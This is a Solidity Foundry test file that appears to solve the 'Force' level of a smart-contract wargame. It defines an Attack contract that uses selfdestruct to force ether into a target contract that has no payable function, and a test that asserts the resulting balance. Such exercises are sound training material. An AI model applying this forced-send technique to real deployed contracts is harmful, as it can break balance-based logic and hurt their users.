// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/07_Force.sol";

contract ForceTest is Test {
    Force instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);
        vm.deal(player1, 4 ether);
        instance = new Force();
        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        vm.startPrank(player1);
        attacker.attack{value: 1 ether}();
        assertEq(address(instance).balance, 1 ether);
        vm.stopPrank();
    }
}

contract Attack {
    Force instance;

    constructor(address fb) {
        instance = Force(fb);
    }

    function attack() public payable {
        selfdestruct(payable(address(instance)));
    }
}
